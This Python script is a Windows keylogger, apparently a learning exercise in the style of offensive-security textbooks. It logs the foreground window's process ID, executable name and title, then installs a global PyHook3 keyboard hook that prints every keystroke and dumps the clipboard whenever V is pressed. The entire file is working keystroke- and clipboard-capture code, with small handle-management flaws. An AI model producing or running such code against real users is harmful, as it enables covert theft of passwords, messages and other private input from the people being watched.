import pythoncom
import PyHook3
import win32clipboard
from ctypes import *
user32 = windll.user32
kernel32 =windll.kernel32
psapi = windll.psapi
current_window = None
hwnd = user32.GetForegroundWindow()
pid = c_ulong(0)
user32.GetWindowThreadProcessId(hwnd,byref(pid))
process_id="%d"%pid.value
#apply for memory 
executable =create_string_buffer(b"\x00" * 512)
h_process = kernel32.OpenProcess(0x400|0x10,False,pid)
print(h_process)
psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
window_title = create_string_buffer(b"\x00"*512)
length=user32.GetWindowTextA(hwnd,byref(window_title),512)
print("----------")
print("[PID:%s - %s - %s]"%(process_id,executable.value,window_title.value))
print("----------")
kernel32.CloseHandle(hwnd)
kernel32.CloseHandle(h_process)


def KeyStroke(event):
    #global current_window
    #if event.WindowName != current_window:
    #   current_window = event.WindowName
    #    get_current_process()
    if event.Ascii >32 and event.Ascii <127:
        print(chr(event.Ascii))
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[Paste] - %s"%(pasted_value))
        else:
            print("[%s]"%event.Key)
    return True
k1 =PyHook3.HookManager()
k1.KeyDown=KeyStroke

k1.HookKeyboard()
pythoncom.PumpMessages()
